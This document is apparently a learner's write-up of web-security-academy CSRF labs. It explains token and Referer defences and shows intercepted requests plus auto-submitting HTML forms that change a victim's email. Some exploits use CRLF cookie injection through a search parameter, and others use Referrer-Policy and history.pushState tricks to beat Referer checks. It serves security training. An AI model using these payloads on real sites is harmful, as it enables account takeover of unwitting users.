# Cross-site request forgery (CSRF)

### What is it?

Attacker sets up a fake website which the victim on click on which will make requests on victim's behalf and perform unauthorised actions using already authenticated credentials found on the victim's browser (e.g. session, cookies). To protect against this, CSRF tokens are used which are set everytime users make an authenticated request. CSRF tokens are hard to guess and hence cannot be easily forged by attacker. If a request is submitted without this CSRF token, then the server will reject it. Another protection mechanism is to look at the referer header. If the request is coming from a server which is not the actual webserver (e.g. the attacker webserver), then the backend system should reject the request.

### Overview:

Task: Trick client to changing their email

Various bypass methodologies:

- CSRF protection using token

    1. No CSRF protection

    2. Changing request header

    3. Removing CSRF token

    4. CSRF token validated on different accounts

    5. CSRF token tagged to non-session cookie (abuse web functionalities to set cookies)

- CSRF protection using Referer header

    1. Removing Referer header

    2. JavaScript to control `Referer` header 

### Lab: CSRF vulnerability with no defenses

Intercepted Request:

```
POST /my-account/change-email HTTP/1.1
Host: 0ae9008e03dde479c09804b60053005f.web-security-academy.net
Cookie: session=rllSb9rExHjIZ5FAxfpUX0SJvJsiDZON
Content-Length: 31
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0ae9008e03dde479c09804b60053005f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae9008e03dde479c09804b60053005f.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

email=asdasdasdasd%40asdasd.com
```

Solution:

Head:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

Body:

```
<html>
    <body>
        <form action="https://0ae9008e03dde479c09804b60053005f.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### CSRF where token validation depends on request method

Intercepted Request:

```
GET /my-account/change-email?email=zxczxczxczxc@cxcxc.com HTTP/1.1
Host: 0aab00d304b08972c0739722000d00b7.web-security-academy.net
Cookie: session=fdiSltLis4TGC0mhCSlsa3bOFS4PPvD3
Content-Length: 63
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0aab00d304b08972c0739722000d00b7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aab00d304b08972c0739722000d00b7.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

email=asdzxc%40zxczxc.com&csrf=FSA7tyqQf4QHBQFqQUEMPqqQRkFyq5Tf
```

Solution: As hinted in the lab description, set the HTTP request method to GET and set the appropriate url parameters

Body:

```
<html>
    <body>
        <form action="https://0aab00d304b08972c0739722000d00b7.web-security-academy.net/my-account/change-email?email=zxczxczxczxc@cxcxc.com" method="GET">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### Validation of CSRF token depends on token being present

Intercepted Request:

```
POST /my-account/change-email HTTP/1.1
Host: 0a9f002104c14a87c02b0da400b2001d.web-security-academy.net
Cookie: session=nAtnVy1F7CqnwPBpbGnjYl8SOkl4SgYz
Content-Length: 57
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a9f002104c14a87c02b0da400b2001d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9f002104c14a87c02b0da400b2001d.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

email=asd%40asd.com <- remove the csrf parameter and it should still work fine
```

Solution: As hinted in the lab description, remove the csrf body parameter to bypass the csrf validation

Body:

```
<html>
    <body>
        <form action="https://0a9f002104c14a87c02b0da400b2001d.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### CSRF token is not tied to the user session

Solution: Use your csrf token 

```
POST /my-account/change-email HTTP/1.1
Host: 0a9a00c903f1fef3c07d0371002b004b.web-security-academy.net
Cookie: session=PEtdIW3OizFP6I5Sf29DaxvfJNJ6oAN8
Content-Length: 67
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a9a00c903f1fef3c07d0371002b004b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9a00c903f1fef3c07d0371002b004b.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

email=asdasdasd%40asdasd.ciom&csrf=0EqlDwriXnpKqgp3iKQPked6XbFAOLsT
```

Solution: As hinted in the lab description, use a csrf token generated by your account

Body:

```
<html>
    <body>
        <form action="https://0a9a00c903f1fef3c07d0371002b004b.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="0EqlDwriXnpKqgp3iKQPked6XbFAOLsT" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### Lab: CSRF where token is tied to non-session cookie

Notes:

- Each request has 2 cookies: csrfKey and session

- Altering session results in a logout

- Altering csrfKey or csrf token results in invalid csrf token error, showing that csrfKey and csrf token are linked

- To successfully exploit this server, we need to set the csrfKey of the victim browser with our csrfKey and make a request with our csrf token.

- `/?search=asd` sets `LastSearchTerm` cookie

- HTTP response after using the `/?search` api

    ```
    HTTP/1.1 200 OK
    Set-Cookie: LastSearchTerm=asdasdasd; Secure; HttpOnly
    Content-Type: text/html; charset=utf-8
    Connection: close
    Content-Length: 3326
    ```

- Abuse `/?search=QUERY` to set csrfKey cookie

- csrfKey cookie and csrf token remains consistent in the same browser but changes in different browsers

- session cookie changes on login and logout from different accounts

Intercepted Request after trying the `/search` api:

```
POST /my-account/change-email HTTP/1.1
Host: 0afd004f03ed58b4c08e4ecf0071007f.web-security-academy.net
Cookie: LastSearchTerm=test; csrfKey=hTwHGgFkxPz5EgyuAVTKOPF83TN1ZW9Q; session=c0YfKwJgwxw5dHpD3z33BV8yJEVymrSr
Content-Length: 63
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0afd004f03ed58b4c08e4ecf0071007f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afd004f03ed58b4c08e4ecf0071007f.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

email=asdasd%40asdasd.com&csrf=WFAIwA7t2UCsxkvc6lbdE33u4SufId4W
```

Solution: 

Body:

```
<html>
    <body>
        <form action="https://0afd004f03ed58b4c08e4ecf0071007f.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="WFAIwA7t2UCsxkvc6lbdE33u4SufId4W" />
        </form>
        <img src="https://0afd004f03ed58b4c08e4ecf0071007f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=hTwHGgFkxPz5EgyuAVTKOPF83TN1ZW9Q" onerror="document.forms[0].submit()">
    </body>
</html>
```

### Lab: CSRF token is simply duplicated in a cookie

Solution: Basically same as previous lab, just set the csrf cookie using the `/?search` api and ensure that the csrf cookie and the csrf token value is the same

Body:

```
<html>
    <body>
        <form action="https://0a8100df03a8bd39c1846a7e0080009c.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="oJ09VIAG79KGrsVJqRKwyf2Q5nEwGG43" />
        </form>
        <img src="https://0a8100df03a8bd39c1846a7e0080009c.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=oJ09VIAG79KGrsVJqRKwyf2Q5nEwGG43" onerror="document.forms[0].submit()">
    </body>
</html>
```

### Lab: CSRF where Referer validation depends on header being present

Solution: add `<meta name="referrer" content="no-referrer">` in HTML

Body:

```
<html>
    <meta name="referrer" content="never">
    <meta name="referrer" content="no-referrer">
    <body>
        <form action="https://0a530020045b2863c0417236007600ef.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### Lab: CSRF with broken Referer validation

Initial exploit:

Head:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

Body:

```
<html>
    <body>
        <form action="https://TARGET-WEBSEVER-ID.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```


Intercepted request from trying to view inital exploit 

```
POST /my-account/change-email HTTP/1.1
Host: TARGET-WEBSEVER-ID.web-security-academy.net
Cookie: session=wEAUNFbKBr6HWLmwkEsPskSkoq0BhTPU
Content-Length: 27
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://EXPLOIT-SERVER-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://EXPLOIT-SERVER-ID.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

email=pwned%40evil-user.net
```
- From this request, we encounter "Invalid referer header" error

- Changing the request to `POST /my-account/change-email?id=TARGET-WEBSERVER-ID.web-security-academy.net`, the request is successful

- Adding `Referer: TARGET-WEBSERVER-ID.web-security-academy.net` makes the request successful as well

1st exploit by trying to add the target URL in the request URL parameters:

```
<html>
    <body>
        <form action="https://TARGET-WEBSEVER-ID.web-security-academy.net/my-account/change-email/?id=TARGET-WEBSEVER-ID.web-security-academy.net" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

- On repeater we get a 302 request and get redirected to login page

- We bypassed the `Referer` validation but still failed to change user email

2nd exploit by trying to set the `Referer` header to one with the target webserver id

```
<html>
    <script>
            history.pushState("", "", "/?TARGET-WEBSEVER-ID.web-security-academy.net")
    </script>
    <body>
        <form action="https://TARGET-WEBSEVER-ID.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

- We observer that out javascript code was not executed as even after setting our url to one with the target webserver url BEFORE running `document.forms[0].submit();` which will trigger another request from which the the referer should be the our attacker url + the target webserver url but we observe that only our attacker url is found in the `referer` header. This is because we did not add `Referrer-Policy: unsafe-url` in the HEAD of our request.

3rd and final exploit

Head:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

Body:

```
<html>
    <script>
            history.pushState("", "", "/?TARGET-WEBSEVER-ID.web-security-academy.net")
    </script>
    <body>
        <form action="https://TARGET-WEBSEVER-ID.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
